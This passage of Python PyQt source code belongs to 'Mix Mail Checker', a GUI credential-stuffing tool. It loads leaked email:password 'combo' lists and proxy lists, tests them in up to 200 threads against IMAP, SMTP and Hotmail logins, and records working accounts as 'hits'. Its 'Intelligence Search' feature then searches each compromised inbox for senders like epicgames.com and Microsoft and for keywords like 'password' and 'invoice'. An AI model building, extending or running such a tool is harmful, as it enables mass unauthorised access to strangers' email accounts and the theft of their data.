            self.buttons.rejected.connect(self.reject)
            self.layout.addWidget(self.buttons)
            
            self.load_settings()

        def init_general_tab(self, tab):
            layout = QFormLayout(tab)
            self.threads_spinbox = QSpinBox()
            self.threads_spinbox.setRange(1, 200)
            self.threads_spinbox.setValue(50)
            self.timeout_spinbox = QSpinBox()
            self.timeout_spinbox.setRange(1, 60)
            self.timeout_spinbox.setSuffix(" s")
            self.delimiter_edit = QLineEdit()
            layout.addRow("Threads:", self.threads_spinbox)
            layout.addRow("Timeout:", self.timeout_spinbox)
            layout.addRow("Combo Delimiter:", self.delimiter_edit)

        def init_proxy_tab(self, tab):
            layout = QFormLayout(tab)
            self.use_proxies_checkbox = QCheckBox("Enable Proxies")
            layout.addRow(self.use_proxies_checkbox)

        def init_intelligence_tab(self, tab):
            layout = QVBoxLayout(tab)
            self.intelligence_search_checkbox = QCheckBox("Enable Intelligence Search on Hits")
            layout.addWidget(self.intelligence_search_checkbox)

            self.search_options_group = QGroupBox("Search Criteria")
            form_layout = QFormLayout(self.search_options_group)

            self.senders_edit = QTextEdit()
            self.senders_edit.setPlaceholderText("One sender email/domain per line")
            self.senders_edit.setMinimumHeight(80)
            
            self.keywords_edit = QTextEdit()
            self.keywords_edit.setPlaceholderText("One keyword per line")
            self.keywords_edit.setMinimumHeight(80)

            search_locations_layout = QHBoxLayout()
            self.search_in_subject_cb = QCheckBox("Subject")
            self.search_in_body_cb = QCheckBox("Body")
            search_locations_layout.addWidget(self.search_in_subject_cb)
            search_locations_layout.addWidget(self.search_in_body_cb)

            self.mailboxes_edit = QLineEdit()
            self.mailboxes_edit.setText("INBOX")
            self.fetch_count_spinbox = QSpinBox()
            self.fetch_count_spinbox.setRange(1, 20)
            self.fetch_count_spinbox.setSuffix(" emails")

            form_layout.addRow("Senders:", self.senders_edit)
            form_layout.addRow("Keywords:", self.keywords_edit)
            form_layout.addRow("Search In:", search_locations_layout)
            form_layout.addRow("Mailboxes:", self.mailboxes_edit)
            form_layout.addRow("Fetch Count:", self.fetch_count_spinbox)
            
            layout.addWidget(self.search_options_group)
            self.intelligence_search_checkbox.toggled.connect(self.search_options_group.setEnabled)

        def init_appearance_tab(self, tab):
            layout = QFormLayout(tab)
            self.theme_combo = QComboBox()
            self.theme_combo.addItems(["dark", "black", "red", "green", "blue", "navy"])
            layout.addRow("Theme:", self.theme_combo)
            
            self.custom_bg_color = QLineEdit()
            self.custom_fg_color = QLineEdit()
            self.custom_button_color = QLineEdit()
            layout.addRow("Background Color:", self.custom_bg_color)
            layout.addRow("Foreground Color:", self.custom_fg_color)
            layout.addRow("Button Color:", self.custom_button_color)

        def load_settings(self):
            s = self.settings_manager
            self.threads_spinbox.setValue(s.value("threads", 50, type=int))
            self.timeout_spinbox.setValue(s.value("timeout", 10, type=int))
            self.delimiter_edit.setText(s.value("delimiter", ":"))
            self.use_proxies_checkbox.setChecked(s.value("use_proxies", False, type=bool))
            
            is_intel_enabled = s.value("intelligence_search_enabled", False, type=bool)
            self.intelligence_search_checkbox.setChecked(is_intel_enabled)
            self.search_options_group.setEnabled(is_intel_enabled)

            self.senders_edit.setText(s.value("intelligence_senders", "epicgames.com\naccount@microsoft.com"))
            self.keywords_edit.setText(s.value("intelligence_keywords", "password\ninvoice"))
            self.search_in_subject_cb.setChecked(s.value("search_in_subject", True, type=bool))
            self.search_in_body_cb.setChecked(s.value("search_in_body", True, type=bool))
            self.mailboxes_edit.setText(s.value("intelligence_mailboxes", "INBOX"))
            self.fetch_count_spinbox.setValue(s.value("intelligence_emails_to_fetch", 3, type=int))
            
            self.theme_combo.setCurrentText(s.value("theme", "dark"))
            self.custom_bg_color.setText(s.value("custom_bg_color", ""))
            self.custom_fg_color.setText(s.value("custom_fg_color", ""))
            self.custom_button_color.setText(s.value("custom_button_color", ""))

        def accept(self):
            s = self.settings_manager
            s.setValue("threads", self.threads_spinbox.value())
            s.setValue("timeout", self.timeout_spinbox.value())
            s.setValue("delimiter", self.delimiter_edit.text())
            s.setValue("use_proxies", self.use_proxies_checkbox.isChecked())
            s.setValue("intelligence_search_enabled", self.intelligence_search_checkbox.isChecked())
            s.setValue("intelligence_senders", self.senders_edit.toPlainText())
            s.setValue("intelligence_keywords", self.keywords_edit.toPlainText())
            s.setValue("search_in_subject", self.search_in_subject_cb.isChecked())
            s.setValue("search_in_body", self.search_in_body_cb.isChecked())
            s.setValue("intelligence_mailboxes", self.mailboxes_edit.text())
            s.setValue("intelligence_emails_to_fetch", self.fetch_count_spinbox.value())
            s.setValue("theme", self.theme_combo.currentText())
            s.setValue("custom_bg_color", self.custom_bg_color.text())
            s.setValue("custom_fg_color", self.custom_fg_color.text())
            s.setValue("custom_button_color", self.custom_button_color.text())
            
            config.set('Settings', 'threads', str(self.threads_spinbox.value()))
            config.set('Settings', 'timeout', str(self.timeout_spinbox.value()))
            config.set('Settings', 'delimiter', self.delimiter_edit.text())
            config.set('Settings', 'theme', self.theme_combo.currentText())
            with open(CONFIG_FILE, 'w', encoding='utf-8') as f:
                config.write(f)
            
            super().accept()

    # ============ INTELLIGENCE REPORT DIALOG ============
    class IntelligenceReportDialog(QDialog):
        def __init__(self, email_details, match_type, match_detail, parent=None):
            super().__init__(parent)
            self.email_details = email_details
            self.setWindowTitle(f"Intelligence Report: {match_type} - {match_detail}")
            self.setMinimumSize(900, 700)

            main_layout = QVBoxLayout(self)
            splitter = QSplitter(Qt.Orientation.Horizontal)
            main_layout.addWidget(splitter)

            self.email_list_widget = QListWidget()
            self.email_list_widget.setMaximumWidth(350)
            splitter.addWidget(self.email_list_widget)

            details_widget = QWidget()
            details_layout = QVBoxLayout(details_widget)
            self.details_tabs = QTabWidget()
            details_layout.addWidget(self.details_tabs)
            
            self.body_view = QTextEdit()
            self.body_view.setReadOnly(True)
            self.headers_view = QTextEdit()
            self.headers_view.setReadOnly(True)
            self.headers_view.setFont(QFont("Courier New", 10))

            self.details_tabs.addTab(self.body_view, "Email Body")
            self.details_tabs.addTab(self.headers_view, "Full Headers")

            splitter.addWidget(details_widget)
            splitter.setSizes([250, 650])

            self.email_list_widget.currentItemChanged.connect(self.display_email_content)
            self.populate_email_list()

        def populate_email_list(self):
            for i, detail in enumerate(self.email_details):
                subject = detail.get('subject', 'No Subject')
                date = detail.get('date', 'No Date')
                item_text = f"Subject: {subject[:40]}...\nDate: {date}"
                item = QListWidgetItem(item_text, self.email_list_widget)
                item.setData(Qt.ItemDataRole.UserRole, i)
            if self.email_details:
                self.email_list_widget.setCurrentRow(0)

        def display_email_content(self, current, previous):
            if current is None:
                return
            index = current.data(Qt.ItemDataRole.UserRole)
            email_data = self.email_details[index]
            body = f"From: {email_data.get('from', '')}\nSubject: {email_data.get('subject', '')}\nDate: {email_data.get('date', '')}\n--- BODY ---\n\n{email_data.get('body', '')}"
            self.body_view.setText(body)
            self.headers_view.setText(email_data.get('headers', ''))

    # ============ DOMAIN VIEWER DIALOG ============
    class DomainViewerDialog(QDialog):
        def __init__(self, domain_mappings, parent=None):
            super().__init__(parent)
            self.setWindowTitle("Domain IMAP Mappings")
            self.setMinimumSize(600, 400)
            self.layout = QVBoxLayout(self)
            self.table = QTableWidget()
            self.layout.addWidget(self.table)
            self.table.setColumnCount(4)
            self.table.setHorizontalHeaderLabels(["Domain", "IMAP Server", "Port", "Source"])
            self.table.horizontalHeader().setSectionResizeMode(0, QHeaderView.ResizeMode.Stretch)
            self.table.horizontalHeader().setSectionResizeMode(1, QHeaderView.ResizeMode.Stretch)
            self.table.setEditTriggers(QTableWidget.EditTrigger.NoEditTriggers)
            self.populate_table(domain_mappings)

        def populate_table(self, domain_mappings):
            self.table.setRowCount(len(domain_mappings))
            for row, (domain, data) in enumerate(sorted(domain_mappings.items())):
                self.table.setItem(row, 0, QTableWidgetItem(domain))
                self.table.setItem(row, 1, QTableWidgetItem(data['server']))
                self.table.setItem(row, 2, QTableWidgetItem(str(data['port'])))
                source_item = QTableWidgetItem(data['source'])
                color = QColor("cyan") if data['source'] == "Custom" else QColor("white")
                source_item.setForeground(color)
                self.table.setItem(row, 3, source_item)

    # ============ MAIN WINDOW ============
    class MainWindow(QMainWindow):
        def __init__(self):
            super().__init__()
            self.setWindowTitle(f"Mix Mail Checker v{VERSION} By @updh1")
            self.setGeometry(100, 100, 1300, 800)
            
            self.settings = QSettings("MixMailChecker", "App")
            
            self.imap_worker = None
            self.imap_worker_thread = None
            self.smtp_worker = None
            self.smtp_worker_thread = None
            self.hotmail_worker = None
            self.hotmail_worker_thread = None
            self.imap_client = None
            self.imap_thread = None
            
            self.imap_is_running = False
            self.smtp_is_running = False
            self.hotmail_is_running = False
            
            self.ini_domains = {}
            self.custom_domains = {}
            self.final_domains = {}
            
            self.themes = {
                "dark": {
                    "background": "#1a237e", "foreground": "#e3f2fd", "menu_background": "#283593",
                    "menu_selected": "#3f51b5", "tab_selected": "#3f51b5", "button_normal": "#3f51b5",
                    "button_hover": "#5c6bc0", "button_pressed": "#283593", "button_disabled": "#1a237e",
                    "input_background": "#1e1e2e", "gridline_color": "#283593", "header_background": "#3f51b5",
                    "progress_chunk": "#5c6bc0", "group_border": "#3f51b5", "splitter_handle": "#3f51b5",
                    "status_background": "#283593"
                },
                "black": {
                    "background": "#000000", "foreground": "#FFFFFF", "menu_background": "#111111",
                    "menu_selected": "#333333", "tab_selected": "#333333", "button_normal": "#333333",
                    "button_hover": "#555555", "button_pressed": "#222222", "button_disabled": "#111111",
                    "input_background": "#111111", "gridline_color": "#333333", "header_background": "#333333",
                    "progress_chunk": "#555555", "group_border": "#333333", "splitter_handle": "#333333",
                    "status_background": "#111111"
                },
                "red": {
                    "background": "#8B0000", "foreground": "#FFB6C1", "menu_background": "#A52A2A",
                    "menu_selected": "#DC143C", "tab_selected": "#DC143C", "button_normal": "#B22222",
                    "button_hover": "#CD5C5C", "button_pressed": "#A52A2A", "button_disabled": "#8B0000",
                    "input_background": "#A0522D", "gridline_color": "#B22222", "header_background": "#B22222",
                    "progress_chunk": "#CD5C5C", "group_border": "#B22222", "splitter_handle": "#B22222",
                    "status_background": "#A52A2A"
                },
                "green": {
                    "background": "#006400", "foreground": "#90EE90", "menu_background": "#228B22",
                    "menu_selected": "#32CD32", "tab_selected": "#32CD32", "button_normal": "#2E8B57",
                    "button_hover": "#3CB371", "button_pressed": "#228B22", "button_disabled": "#006400",
                    "input_background": "#2F4F4F", "gridline_color": "#2E8B57", "header_background": "#2E8B57",
                    "progress_chunk": "#3CB371", "group_border": "#2E8B57", "splitter_handle": "#2E8B57",
                    "status_background": "#228B22"
                },
                "blue": {
                    "background": "#00008B", "foreground": "#87CEEB", "menu_background": "#4169E1",
                    "menu_selected": "#1E90FF", "tab_selected": "#1E90FF", "button_normal": "#4682B4",
                    "button_hover": "#87CEEB", "button_pressed": "#4169E1", "button_disabled": "#00008B",
                    "input_background": "#2F4F4F", "gridline_color": "#4682B4", "header_background": "#4682B4",
                    "progress_chunk": "#87CEEB", "group_border": "#4682B4", "splitter_handle": "#4682B4",
                    "status_background": "#4169E1"
                },
                "navy": {
                    "background": "#000080", "foreground": "#ADD8E6", "menu_background": "#191970",
                    "menu_selected": "#4169E1", "tab_selected": "#4169E1", "button_normal": "#4169E1",
                    "button_hover": "#6495ED", "button_pressed": "#191970", "button_disabled": "#000080",
                    "input_background": "#191970", "gridline_color": "#4169E1", "header_background": "#4169E1",
                    "progress_chunk": "#6495ED", "group_border": "#4169E1", "splitter_handle": "#4169E1",
                    "status_background": "#191970"
                }
            }
            
            create_default_domains_ini_gui()
            self._load_ini_domains()
            self._update_final_domains()
            
            self.apply_theme(self.settings.value("theme", "dark"))
            self.init_ui()
            
        def apply_theme(self, theme_name):
            if theme_name not in self.themes:
                theme_name = "dark"
            theme = self.themes[theme_name]
            palette = QPalette()
            palette.setColor(QPalette.ColorRole.Window, QColor(theme["background"]))
            palette.setColor(QPalette.ColorRole.WindowText, QColor(theme["foreground"]))
            palette.setColor(QPalette.ColorRole.Base, QColor(theme["input_background"]))
            palette.setColor(QPalette.ColorRole.AlternateBase, QColor(theme["background"]))
            palette.setColor(QPalette.ColorRole.ToolTipBase, QColor(theme["background"]))
            palette.setColor(QPalette.ColorRole.ToolTipText, QColor(theme["foreground"]))
            palette.setColor(QPalette.ColorRole.Text, QColor(theme["foreground"]))
            palette.setColor(QPalette.ColorRole.Button, QColor(theme["button_normal"]))
            palette.setColor(QPalette.ColorRole.ButtonText, QColor(theme["foreground"]))
            palette.setColor(QPalette.ColorRole.BrightText, QColor("red"))
            palette.setColor(QPalette.ColorRole.Highlight, QColor(theme["tab_selected"]))
            palette.setColor(QPalette.ColorRole.HighlightedText, QColor(theme["foreground"]))
            self.setPalette(palette)
            self.setStyleSheet(f"""
                QMainWindow, QDialog {{ background-color: {theme['background']}; }}
                QWidget {{ color: {theme['foreground']}; }}
                QMenuBar {{ background-color: {theme['menu_background']}; }}
                QMenuBar::item:selected {{ background: {theme['menu_selected']}; }}
                QMenu {{ background-color: {theme['menu_background']}; border: 1px solid {theme['menu_selected']}; }}
                QMenu::item:selected {{ background-color: {theme['menu_selected']}; }}
                QTabWidget::pane {{ border: 1px solid {theme['group_border']}; }}
                QTabBar::tab {{ background: {theme['menu_background']}; color: {theme['foreground']}; padding: 10px; }}
                QTabBar::tab:selected {{ background: {theme['tab_selected']}; }}
                QTableWidget, QListWidget {{ background-color: {theme['input_background']}; gridline-color: {theme['gridline_color']}; border: none; }}
                QHeaderView::section {{ background-color: {theme['header_background']}; color: {theme['foreground']}; padding: 4px; border: 1px solid {theme['button_hover']}; }}
                QPushButton {{ background-color: {theme['button_normal']}; color: {theme['foreground']}; border: none; padding: 8px 16px; border-radius: 4px; font-weight: bold; }}
                QPushButton:hover {{ background-color: {theme['button_hover']}; }}
                QPushButton:pressed {{ background-color: {theme['button_pressed']}; }}
                QPushButton:disabled {{ background-color: {theme['button_disabled']}; }}
                QLineEdit, QSpinBox, QComboBox, QTextEdit {{ background-color: {theme['input_background']}; color: {theme['foreground']}; border: 2px solid {theme['button_normal']}; padding: 5px; border-radius: 4px; }}
                QProgressBar {{ border-radius: 4px; text-align: center; border: 2px solid {theme['button_normal']}; background-color: {theme['input_background']}; }}
                QProgressBar::chunk {{ background-color: {theme['progress_chunk']}; border-radius: 4px; }}
                QGroupBox {{ border: 2px solid {theme['group_border']}; color: {theme['foreground']}; margin-top: 10px; font-weight: bold; }}
                QStatusBar {{ background-color: {theme['status_background']}; color: {theme['foreground']}; }}
                QSplitter::handle {{ background-color: {theme['splitter_handle']}; }}
                QCheckBox {{ color: {theme['foreground']}; }}
                QLabel {{ color: {theme['foreground']}; }}
            """)

        def _load_ini_domains(self):
            config_ini = configparser.ConfigParser()
            if os.path.exists('domains.ini'):
                config_ini.read('domains.ini', encoding='utf-8')
                for section in config_ini.sections():
                    if section != 'DEFAULT':
                        self.ini_domains[section] = {
                            'server': config_ini.get(section, 'server', fallback=f"imap.{section}"),
                            'port': config_ini.getint(section, 'port', fallback=993),
                            'source': 'Default'
                        }

        def _update_final_domains(self):
            self.final_domains = self.ini_domains.copy()
            self.final_domains.update(self.custom_domains)

        def get_imap_server_from_domain(self, domain):
            if domain in self.final_domains:
                mapping = self.final_domains[domain]
                return mapping['server'], mapping['port']
            return f"imap.{domain}", 993

        def init_ui(self):
            self.central_widget = QWidget()
            self.setCentralWidget(self.central_widget)
            self.main_layout = QVBoxLayout(self.central_widget)

            self.init_menu_bar()

            # Główny tab widget
            self.main_tabs = QTabWidget()
            self.main_layout.addWidget(self.main_tabs)

            # IMAP Checker Tab
            self.imap_tab = QWidget()
            self.main_tabs.addTab(self.imap_tab, "📧 IMAP Checker")
            self.init_imap_tab()

            # SMTP Checker Tab
            self.smtp_tab = QWidget()
            self.main_tabs.addTab(self.smtp_tab, "📨 SMTP Checker")
            self.init_smtp_tab()

            # Hotmail Checker Tab
            self.hotmail_tab = QWidget()
            self.main_tabs.addTab(self.hotmail_tab, "🔥 Hotmail Checker")
            self.init_hotmail_tab()

            # IMAP Viewer Tab (zawsze dostępny)
            self.imap_viewer_tab = QWidget()
            self.main_tabs.addTab(self.imap_viewer_tab, "🔍 IMAP Viewer")
            self.init_imap_viewer_tab()

            # Status Bar
            self.status_bar = QStatusBar()
            self.setStatusBar(self.status_bar)
            self.status_label = QLabel("Ready")
            self.cpm_label = QLabel("CPM: 0")
            self.status_bar.addWidget(self.status_label, 1)
            self.status_bar.addWidget(self.cpm_label)

        def init_menu_bar(self):
            menu_bar = self.menuBar()
            file_menu = menu_bar.addMenu("&File")
            file_menu.addAction("Settings...", self.open_settings)
            file_menu.addSeparator()
            file_menu.addAction("Exit", self.close)

            domain_menu = menu_bar.addMenu("&Domains")
            domain_menu.addAction("Load Custom Domains...", self.load_custom_domains)
            domain_menu.addAction("View Domain Mappings...", self.view_domain_mappings)

            tools_menu = menu_bar.addMenu("&Tools")
            tools_menu.addAction("Clear All Results", self.clear_all_results)

        def load_custom_domains(self):
            try:
                file_path, _ = QFileDialog.getOpenFileName(self, "Open Custom Domains File", "", "Text Files (*.txt);;All Files (*)")
                if file_path:
                    try:
                        count = 0
                        with open(file_path, 'r', encoding='utf-8') as f:
                            for line in f:
                                if '|' in line:
                                    domain, server = line.strip().split('|', 1)
                                    self.custom_domains[domain.strip()] = {
                                        'server': server.strip(),
                                        'port': 993,
                                        'source': 'Custom'
                                    }
                                    count += 1
                        self._update_final_domains()
                        self.status_label.setText(f"Loaded {count} custom domain mappings.")
                    except Exception as e:
                        QMessageBox.critical(self, "Error", f"Failed to load custom domains file: {e}")
            except Exception:
                pass

        def view_domain_mappings(self):
            dialog = DomainViewerDialog(self.final_domains, self)
            dialog.exec()

        # ============ IMAP CHECKER TAB ============
        def init_imap_tab(self):
            layout = QVBoxLayout(self.imap_tab)

            top_layout = QHBoxLayout()
            self.imap_btn_load = QPushButton("📂 Load Combos")
            self.imap_btn_load_proxies = QPushButton("🌐 Load Proxies")
            self.imap_btn_start = QPushButton("▶ Start")
            self.imap_btn_pause = QPushButton("⏸ Pause")
            self.imap_btn_stop = QPushButton("⏹ Stop")
            self.imap_btn_stop.setEnabled(False)
            self.imap_btn_pause.setEnabled(False)
            
            top_layout.addWidget(self.imap_btn_load)
            top_layout.addWidget(self.imap_btn_load_proxies)
            top_layout.addStretch()
            top_layout.addWidget(self.imap_btn_start)
            top_layout.addWidget(self.imap_btn_pause)
            top_layout.addWidget(self.imap_btn_stop)
            layout.addLayout(top_layout)

            stats_layout = QHBoxLayout()
            stats_group = QGroupBox("IMAP Statistics")
            stats_grid = QHBoxLayout(stats_group)
            self.imap_stats = {}
            for name in ["Checked", "Hits", "Bad", "Custom", "Intel Hits", "Combos"]:
                box = QVBoxLayout()
                lbl_name = QLabel(name)
                lbl_name.setAlignment(Qt.AlignmentFlag.AlignCenter)
                lbl_val = QLabel("0")
                lbl_val.setAlignment(Qt.AlignmentFlag.AlignCenter)
                lbl_val.setFont(QFont("Arial", 14, QFont.Weight.Bold))
                lbl_val.setStyleSheet("color: #aaffff;")
                box.addWidget(lbl_name)
                box.addWidget(lbl_val)
                stats_grid.addLayout(box)
                self.imap_stats[name.lower().replace(" ", "_")] = lbl_val
            layout.addWidget(stats_group)

            self.imap_progress = QProgressBar()
            layout.addWidget(self.imap_progress)

            self.imap_results_tabs = QTabWidget()
            self.imap_table_hits = self.create_table(["Combo", "Details"])
            self.imap_table_bad = self.create_table(["Combo", "Reason"])
            self.imap_table_intel = self.create_table(["Email", "Match Type", "Match Detail", "Mailbox", "Found"])
            self.imap_log = QTextEdit()
            self.imap_log.setReadOnly(True)
            
            self.imap_results_tabs.addTab(self.imap_table_hits, "Hits (0)")
            self.imap_results_tabs.addTab(self.imap_table_intel, "Intel Hits (0)")
            self.imap_results_tabs.addTab(self.imap_table_bad, "Bad (0)")
            self.imap_results_tabs.addTab(self.imap_log, "Log")
            layout.addWidget(self.imap_results_tabs)

            self.imap_btn_load.clicked.connect(self.imap_load_combos)
            self.imap_btn_load_proxies.clicked.connect(self.imap_load_proxies)
            self.imap_btn_start.clicked.connect(self.imap_start)
            self.imap_btn_pause.clicked.connect(self.imap_pause)
            self.imap_btn_stop.clicked.connect(self.imap_stop)

        def create_table(self, headers):
            table = QTableWidget()
            table.setColumnCount(len(headers))
            table.setHorizontalHeaderLabels(headers)
            table.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
            table.verticalHeader().setVisible(False)
            table.setEditTriggers(QTableWidget.EditTrigger.NoEditTriggers)
            table.setSelectionBehavior(QTableWidget.SelectionBehavior.SelectRows)
            table.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
            table.customContextMenuRequested.connect(lambda pos, t=table: self.show_table_context_menu(t, pos))
            return table

        def imap_load_combos(self):
            file_path, _ = QFileDialog.getOpenFileName(self, "Open Combo List", "", "Text Files (*.txt)")
            if file_path:
                try:
                    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                        self.imap_combos = [line.strip() for line in f if line.strip() and ':' in line]
                    self.imap_stats['combos'].setText(str(len(self.imap_combos)))
                    self.imap_progress.setMaximum(len(self.imap_combos))
                    self.status_label.setText(f"Loaded {len(self.imap_combos)} combos")
                except Exception as e:
                    QMessageBox.critical(self, "Error", f"Failed to load: {e}")

        def imap_load_proxies(self):
            file_path, _ = QFileDialog.getOpenFileName(self, "Open Proxy List", "", "Text Files (*.txt)")
            if file_path:
                try:
                    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                        self.imap_proxies = [line.strip() for line in f if line.strip()]
                    self.status_label.setText(f"Loaded {len(self.imap_proxies)} proxies")
                except Exception as e:
                    QMessageBox.critical(self, "Error", f"Failed to load: {e}")

        def imap_start(self):
            if not hasattr(self, 'imap_combos') or not self.imap_combos:
                QMessageBox.warning(self, "Warning", "Load combos first!")
                return

            self.imap_is_running = True
            self.imap_btn_start.setEnabled(False)
            self.imap_btn_pause.setEnabled(True)
            self.imap_btn_stop.setEnabled(True)
            self.imap_btn_load.setEnabled(False)
            self.imap_btn_load_proxies.setEnabled(False)

            settings = {
                "threads": self.settings.value("threads", 50, type=int),
                "timeout": self.settings.value("timeout", 10, type=int),
                "delimiter": self.settings.value("delimiter", ":"),
                "use_proxies": self.settings.value("use_proxies", False, type=bool),
                "intelligence_search_enabled": self.settings.value("intelligence_search_enabled", False, type=bool),
                "intelligence_keywords": self.settings.value("intelligence_keywords", ""),
                "intelligence_senders": self.settings.value("intelligence_senders", ""),
                "search_in_subject": self.settings.value("search_in_subject", True, type=bool),
                "search_in_body": self.settings.value("search_in_body", True, type=bool),
                "intelligence_mailboxes": self.settings.value("intelligence_mailboxes", "INBOX"),
                "intelligence_emails_to_fetch": self.settings.value("intelligence_emails_to_fetch", 3, type=int),
                "domain_mappings": self.final_domains
            }

            self.imap_worker = IMAPCheckerWorker(settings, create_results_folder())
            for combo in self.imap_combos:
                self.imap_worker.combo_queue.put(combo)
            if hasattr(self, 'imap_proxies'):
                for proxy in self.imap_proxies:
                    self.imap_worker.proxy_queue.put(proxy)

            self.imap_worker_thread = QThread()
            self.imap_worker.moveToThread(self.imap_worker_thread)

            self.imap_worker.signals.progress.connect(self.imap_update_progress)
            self.imap_worker.signals.result.connect(self.imap_add_result)
            self.imap_worker.signals.log.connect(self.imap_add_log)
            self.imap_worker.signals.finished.connect(self.imap_finished)
            self.imap_worker.signals.cpm.connect(self.update_cpm)
            self.imap_worker.signals.keyword_hit_details.connect(self.imap_add_intel_hit)

            self.imap_worker_thread.started.connect(self.imap_worker.run)
            self.imap_worker_thread.start()

        def imap_pause(self):
            if self.imap_worker:
                self.imap_worker.toggle_pause()
                self.imap_btn_pause.setText("▶ Resume" if self.imap_worker.is_paused else "⏸ Pause")

        def imap_stop(self):
            if self.imap_worker:
                self.imap_worker.stop()
            self.imap_is_running = False
            self.imap_btn_start.setEnabled(True)
            self.imap_btn_pause.setEnabled(False)
            self.imap_btn_stop.setEnabled(False)
            self.imap_btn_load.setEnabled(True)
            self.imap_btn_load_proxies.setEnabled(True)

        def imap_update_progress(self, checked, hits, bad, custom, keyword_hits):
            self.imap_progress.setValue(checked)
            self.imap_stats['checked'].setText(str(checked))
            self.imap_stats['hits'].setText(str(hits))
            self.imap_stats['bad'].setText(str(bad))
            self.imap_stats['custom'].setText(str(custom))
            self.imap_stats['intel_hits'].setText(str(keyword_hits))

        def imap_add_result(self, result_type, combo, details):
            if result_type == "hit":
                table = self.imap_table_hits
                color = QColor("lime")
                tab_idx = 0
                tab_name = "Hits"
            elif result_type == "bad":
                table = self.imap_table_bad
                color = QColor("red")
                tab_idx = 2
                tab_name = "Bad"
            else:
                return

            row = table.rowCount()
            table.insertRow(row)
            item1 = QTableWidgetItem(combo)
            item2 = QTableWidgetItem(details)
            item1.setForeground(QBrush(color))
            item2.setForeground(QBrush(color))
            table.setItem(row, 0, item1)
            table.setItem(row, 1, item2)
            self.imap_results_tabs.setTabText(tab_idx, f"{tab_name} ({row + 1})")

        def imap_add_intel_hit(self, email, match_type, match_detail, mailbox, details):
            table = self.imap_table_intel
            row = table.rowCount()
            table.insertRow(row)
            items = [
                QTableWidgetItem(email),
                QTableWidgetItem(match_type),
                QTableWidgetItem(match_detail),
                QTableWidgetItem(mailbox),
                QTableWidgetItem(f"{len(details)} emails")
            ]
            brush = QBrush(QColor("cyan"))
            for item in items:
                item.setForeground(brush)
            for col, item in enumerate(items):
                table.setItem(row, col, item)
            table.item(row, 0).setData(Qt.ItemDataRole.UserRole, (details, match_type, match_detail))
            self.imap_results_tabs.setTabText(1, f"Intel Hits ({row + 1})")

        def imap_add_log(self, message, color):
            self.imap_log.moveCursor(QTextCursor.MoveOperation.End)
            self.imap_log.setTextColor(color)
            self.imap_log.insertPlainText(f"{datetime.now().strftime('%H:%M:%S')} - {message}\n")
            self.imap_log.moveCursor(QTextCursor.MoveOperation.End)

        def imap_finished(self, stats, elapsed, cpm):
            self.imap_is_running = False
            self.imap_btn_start.setEnabled(True)
            self.imap_btn_pause.setEnabled(False)
            self.imap_btn_stop.setEnabled(False)
            self.imap_btn_load.setEnabled(True)
            self.imap_btn_load_proxies.setEnabled(True)
            self.status_label.setText("IMAP Checker finished!")

        # ============ SMTP CHECKER TAB ============
        def init_smtp_tab(self):
            layout = QVBoxLayout(self.smtp_tab)

            top_layout = QHBoxLayout()
            self.smtp_btn_load = QPushButton("📂 Load Combos")
            self.smtp_btn_start = QPushButton("▶ Start")
            self.smtp_btn_pause = QPushButton("⏸ Pause")
            self.smtp_btn_stop = QPushButton("⏹ Stop")
            self.smtp_btn_stop.setEnabled(False)
            self.smtp_btn_pause.setEnabled(False)
            
            top_layout.addWidget(self.smtp_btn_load)
            top_layout.addStretch()
            top_layout.addWidget(self.smtp_btn_start)
            top_layout.addWidget(self.smtp_btn_pause)
            top_layout.addWidget(self.smtp_btn_stop)
            layout.addLayout(top_layout)

            stats_layout = QHBoxLayout()
            stats_group = QGroupBox("SMTP Statistics")
            stats_grid = QHBoxLayout(stats_group)
            self.smtp_stats = {}
            for name in ["Checked", "Valid", "Invalid", "Combos"]:
                box = QVBoxLayout()
                lbl_name = QLabel(name)
                lbl_name.setAlignment(Qt.AlignmentFlag.AlignCenter)
                lbl_val = QLabel("0")
                lbl_val.setAlignment(Qt.AlignmentFlag.AlignCenter)
                lbl_val.setFont(QFont("Arial", 14, QFont.Weight.Bold))
                lbl_val.setStyleSheet("color: #aaffff;")
                box.addWidget(lbl_name)
                box.addWidget(lbl_val)
                stats_grid.addLayout(box)
                self.smtp_stats[name.lower().replace(" ", "_")] = lbl_val
            layout.addWidget(stats_group)

            self.smtp_progress = QProgressBar()
            layout.addWidget(self.smtp_progress)

            self.smtp_results_tabs = QTabWidget()
            self.smtp_table_valid = self.create_table(["Combo", "Server|Port"])
            self.smtp_table_invalid = self.create_table(["Email", "Reason"])
            self.smtp_log = QTextEdit()
            self.smtp_log.setReadOnly(True)
            
            self.smtp_results_tabs.addTab(self.smtp_table_valid, "Valid (0)")
            self.smtp_results_tabs.addTab(self.smtp_table_invalid, "Invalid (0)")
            self.smtp_results_tabs.addTab(self.smtp_log, "Log")
            layout.addWidget(self.smtp_results_tabs)

            self.smtp_btn_load.clicked.connect(self.smtp_load_combos)
            self.smtp_btn_start.clicked.connect(self.smtp_start)
            self.smtp_btn_pause.clicked.connect(self.smtp_pause)
            self.smtp_btn_stop.clicked.connect(self.smtp_stop)

        def smtp_load_combos(self):
            file_path, _ = QFileDialog.getOpenFileName(self, "Open Combo List", "", "Text Files (*.txt)")
            if file_path:
                try:
                    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                        self.smtp_combos = [line.strip() for line in f if line.strip() and ':' in line]
                    self.smtp_stats['combos'].setText(str(len(self.smtp_combos)))
                    self.smtp_progress.setMaximum(len(self.smtp_combos))
                    self.status_label.setText(f"Loaded {len(self.smtp_combos)} combos for SMTP")
                except Exception as e:
                    QMessageBox.critical(self, "Error", f"Failed to load: {e}")

        def smtp_start(self):
            if not hasattr(self, 'smtp_combos') or not self.smtp_combos:
                QMessageBox.warning(self, "Warning", "Load combos first!")
                return

            self.smtp_is_running = True
            self.smtp_btn_start.setEnabled(False)
            self.smtp_btn_pause.setEnabled(True)
            self.smtp_btn_stop.setEnabled(True)
            self.smtp_btn_load.setEnabled(False)

            settings = {
                "threads": self.settings.value("threads", 50, type=int),
                "timeout": self.settings.value("timeout", 10, type=int),
            }

            self.smtp_worker = SMTPCheckerWorker(settings)
            for combo in self.smtp_combos:
                if ':' in combo:
                    email, password = combo.split(':', 1)
                    self.smtp_worker.combo_queue.put((email, password))

            self.smtp_worker_thread = QThread()
            self.smtp_worker.moveToThread(self.smtp_worker_thread)

